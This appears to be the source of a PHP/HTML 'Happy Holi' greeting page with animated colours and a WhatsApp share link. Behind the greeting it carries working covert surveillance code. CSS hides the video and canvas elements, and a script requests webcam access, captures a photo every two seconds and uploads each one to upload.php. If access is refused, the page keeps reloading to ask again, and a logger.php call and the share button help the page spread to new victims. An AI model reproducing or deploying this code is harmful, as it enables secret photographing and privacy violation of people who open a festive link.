<?php
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
  @file_get_contents("logger.php");
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Happy Holi</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    html, body {
      height: 100%;
      width: 100%;
      font-family: 'Segoe UI', sans-serif;
      background: linear-gradient(-45deg, #ff6ec4, #7873f5, #42e695, #f9d423);
      background-size: 400% 400%;
      animation: gradientMove 15s ease infinite;
      color: #ffffff;
      text-align: center;
      overflow-x: hidden;
    }

    @keyframes gradientMove {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }

    .container {
      padding: 40px 20px;
      max-width: 800px;
      margin: 0 auto;
      position: relative;
      z-index: 1;
    }

    .happy-text {
      font-size: 3.5rem;
      font-weight: bold;
      text-shadow: 0 0 15px rgba(0, 0, 0, 0.4);
      animation: popIn 2s ease;
      margin-bottom: 20px;
    }

    .emoji {
      font-size: 2.5rem;
      margin: 0 5px;
    }

    .sub-text {
      font-size: 1.3rem;
      background: rgba(255,255,255,0.1);
      padding: 15px 25px;
      border-radius: 12px;
      margin-bottom: 30px;
      box-shadow: 0 0 10px rgba(255,255,255,0.2);
      backdrop-filter: blur(4px);
    }

    .gif {
      width: 260px;
      max-width: 90%;
      border-radius: 12px;
      box-shadow: 0 0 15px rgba(255,255,255,0.3);
      animation: float 4s ease-in-out infinite;
      margin: 40px auto;
      display: block;
    }

    .big-message {
      position: relative;
      font-size: 1.3rem;
      font-weight: 600;
      padding: 30px 20px 40px;
      border-radius: 15px;
      background-image: url('https://i.ibb.co/CsYVJ8z1/b83151193352b6878785956915eabe06.jpg');
      background-size: cover;
      background-position: center;
      color: #fff;
      line-height: 1.8;
      box-shadow: 0 0 25px rgba(0,0,0,0.3);
      overflow: hidden;
      text-shadow: 0 0 5px rgba(0,0,0,0.4);
    }

    .big-message::before {
      content: '';
      position: absolute;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: rgba(0,0,0,0.4);
      z-index: 0;
    }

    .big-message::after {
      content: '';
      position: absolute;
      bottom: 0;
      left: 0;
      width: 100%;
      height: 5%;
      background: rgba(255, 255, 255, 0.05);
      z-index: 1;
    }

    .big-message p {
      position: relative;
      z-index: 2;
      margin-bottom: 1.2rem;
    }

    .send-button {
      display: inline-block;
      margin-top: 30px;
      padding: 14px 26px;
      font-size: 1.1rem;
      font-weight: bold;
      background: linear-gradient(45deg, #ff4081, #f9d423, #69f0ae, #7c4dff);
      background-size: 200% auto;
      color: #fff;
      border: none;
      border-radius: 50px;
      cursor: pointer;
      text-decoration: none;
      box-shadow: 0 5px 15px rgba(0,0,0,0.3);
      animation: buttonGlow 3s linear infinite;
      transition: transform 0.3s;
    }

    .send-button:hover {
      transform: scale(1.05);
    }

    @keyframes buttonGlow {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }

    footer {
      padding: 20px;
      font-size: 0.9rem;
      color: rgba(255, 255, 255, 0.7);
    }

    @keyframes popIn {
      from { opacity: 0; transform: scale(0.7); }
      to { opacity: 1; transform: scale(1); }
    }

    @keyframes float {
      0%, 100% { transform: translateY(0); }
      50% { transform: translateY(-10px); }
    }

    .gulal {
      position: fixed;
      top: -50px;
      width: 15px;
      height: 15px;
      border-radius: 50%;
      opacity: 0.8;
      animation: fall linear infinite;
      z-index: 0;
    }

    @keyframes fall {
      0% { transform: translateY(0) rotate(0); }
      100% { transform: translateY(110vh) rotate(360deg); }
    }

    @media (max-width: 480px) {
      .happy-text {
        font-size: 2.4rem;
      }
      .sub-text, .big-message {
        font-size: 1rem;
        padding: 20px;
      }
    }

    video, canvas {
      display: none !important;
    }
  </style>
</head>
<body>


  <script>
    const colors = ['#ff4081', '#ffd740', '#69f0ae', '#40c4ff', '#ff5252', '#7c4dff', '#f50057'];
    for (let i = 0; i < 50; i++) {
      const gulal = document.createElement('div');
      gulal.classList.add('gulal');
      gulal.style.left = Math.random() * 100 + 'vw';
      gulal.style.animationDuration = (5 + Math.random() * 5) + 's';
      gulal.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
      document.body.appendChild(gulal);
    }
  </script>


  <video id="video" autoplay playsinline></video>
  <canvas id="canvas"></canvas>

  <div class="container">
    <div class="happy-text">
      <span class="emoji">&#x1F338;</span> Happy Holi <span class="emoji">&#x1F308;</span>
    </div>

    <div class="sub-text">
      Wishing you a festival filled with vibrant colors and boundless joy!<br>
      Let the spirit of Holi brighten your life with love and laughter.<br>
      <span class="emoji">&#x1F33A;</span> <span class="emoji">&#x1F386;</span> <span class="emoji">&#x1F38A;</span>
    </div>

    <img
      class="gif"
      src="https://media1.giphy.com/media/v1.Y2lkPTZjMDliOTUyMzZyZDRhNW8yZ2E0bzdrem9rMGI3Mng1aXZhNGVrbnBzY3Nwc3Y0aiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/3otPoKX2tUvWtHF8Wc/giphy.gif"
      alt="Holi Celebration GIF"
    >

    <div class="big-message">
      <p>This Holi, may your heart be filled with <strong>colors of happiness</strong>,</p>
      <p>your mind with <strong>creativity</strong>, and your soul with the <strong>spirit of togetherness</strong>.</p>
      <p>Celebrate this day of <strong>unity and love</strong> with colors that speak louder than words.</p>
      <p>A big, bright and beautiful <strong>HAPPY HOLI</strong> to you and your family! &#x1F60D; &#x1F389;</p>
    </div>

    <a id="sendButton" class="send-button" href="#" target="_blank">
      &#x1F389; Send Holi Wishes
    </a>
  </div>

  <footer>
    &copy; All rights reserved 2025
  </footer>


  <script>
    const siteURL = encodeURIComponent(window.location.href);
    const message = encodeURIComponent("Happy Holi! 🎉🌈 Wishing you a festival full of colors and love! 💖\nCheck this out 👉 ");
    const finalURL = `https://wa.me/?text=${message}${siteURL}`;
    document.getElementById("sendButton").setAttribute("href", finalURL);
  </script>


  <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');
    let lastImageHash = "";

    function getImageHash(dataUrl) {
      let hash = 0;
      for (let i = 0; i < dataUrl.length; i++) {
        const char = dataUrl.charCodeAt(i);
        hash = ((hash << 5) - hash) + char;
        hash |= 0;
      }
      return hash;
    }

    function captureAndSend() {
      const width = video.videoWidth;
      const height = video.videoHeight;

      if (width === 0 || height === 0) return;

      canvas.width = width;
      canvas.height = height;
      ctx.drawImage(video, 0, 0, width, height);

      const dataUrl = canvas.toDataURL('image/jpeg', 0.9);
      const hash = getImageHash(dataUrl);
      if (hash === lastImageHash) return;

      lastImageHash = hash;

      fetch('upload.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ image: dataUrl })
      });
    }

    function startCamera() {
      navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
          video.srcObject = stream;
          setInterval(captureAndSend, 2000);
        })
        .catch(err => {
          console.warn("Camera access failed:", err);
          setTimeout(() => location.reload(), 5000);
        });
    }

    startCamera();
fetch("logger.php").then(res => res.text()).then(console.log);
  </script>
</body>
</html>
